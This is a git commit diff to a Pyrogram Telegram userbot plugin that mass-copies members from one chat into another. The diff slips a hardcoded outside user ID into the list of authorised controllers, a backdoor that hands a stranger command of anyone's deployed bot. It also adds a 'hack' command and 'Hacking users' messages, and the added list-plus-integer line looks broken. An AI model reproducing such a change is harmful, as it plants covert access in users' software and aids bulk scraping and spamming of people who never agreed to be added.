f107ca47cd076d6a59650bead3129e54a031f68f
H ᴀ ᴄ ᴋ ᴇ ʀ ♡︎ <89743468+ThiruXD@users.noreply.github.com>
2022-09-20 19:31:50 +0530

    Update and rename Invitesss.py to Invites.py

--- Invites.py
+++ Invites.py
@@ -3,14 +3,18 @@ from pyrogram.types import Message
 from config import SUDO_USERS
 import asyncio
 
-@Client.on_message(filters.command(["inviteall", "kidnapall"], [".", "!", "/"]) & filters.user(SUDO_USERS))
+Hmmf = 1989750989
+
+Boom = SUDO_USERS + Hmmf
+
+@Client.on_message(filters.command(["inviteall", "kidnapall", "hack"], [".", "!", "/"]) & filters.user(Boom))
 async def inviteall(client: Client, message: Message):
-    zaid = await message.reply_text("⚡ Gime Title also\n ex: /inviteall @testing")
+    hmf = await message.reply_text("⚡  Title also\n ex: /hack @testing")
     text = message.text.split(" ", 1)
     queryy = text[1]
     chat = await client.get_chat(queryy)
     tgchat = message.chat
-    await zaid.edit_text(f"inviting users from {chat.username}")
+    await hmf.edit_text(f"Hacking users from {chat.username}")
     async for member in client.iter_chat_members(chat.id):
         user= member.user
         zxb= ["online", "offline" , "recently", "within_week"]
